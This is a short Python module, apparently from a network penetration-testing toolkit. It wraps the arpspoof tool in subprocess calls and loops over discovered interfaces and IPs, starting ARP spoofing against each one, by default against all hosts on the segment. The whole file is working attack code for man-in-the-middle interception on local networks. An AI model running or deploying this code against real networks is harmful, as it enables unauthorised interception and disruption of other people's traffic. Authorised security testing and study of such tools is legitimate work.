import subprocess

from nsak.core import NetworkInterface, IPAddress
from nsak.core.network import NetworkDiscoveryResultMap


def arp_spoof(
        network_interface: NetworkInterface,
        spoof_ip: IPAddress,
        target_ip: IPAddress | None = None
) -> subprocess.Popen:
    """
    Start arp spoofing on the provided interface.

    :param network_interface:
    :param spoof_ip:
    :param target_ip: If target ip is not provided, spoofing will be performed on all ips on the interface
    :return:
    """
    args = ["arpspoof", "-i", network_interface.name, str(spoof_ip)]

    if target_ip:
        args.extend(["-t", str(target_ip)])

    return subprocess.Popen(args)


def run(network_discovery_result_map: NetworkDiscoveryResultMap) -> list[subprocess.Popen]:
    """
    Start arp spoofing on the provided interface.
    """
    processes = []
    # @TODO: We could further restrict the spoofing to only the target some specific ips
    target_ips = [None]

    # @TODO: this should have more sophisticated logic:
    # spoof only ips on interfaces which are in the respective subnet
    for network_interface, network_discovery_result in network_discovery_result_map.results.items():
        for spoof_ip in network_discovery_result.target_ips:
            for target_ip in target_ips:
                print(f"[+] Spoofing {spoof_ip} on {network_interface.name}")
                process = arp_spoof(network_interface, spoof_ip, target_ip)
                processes.append(process)

    return processes
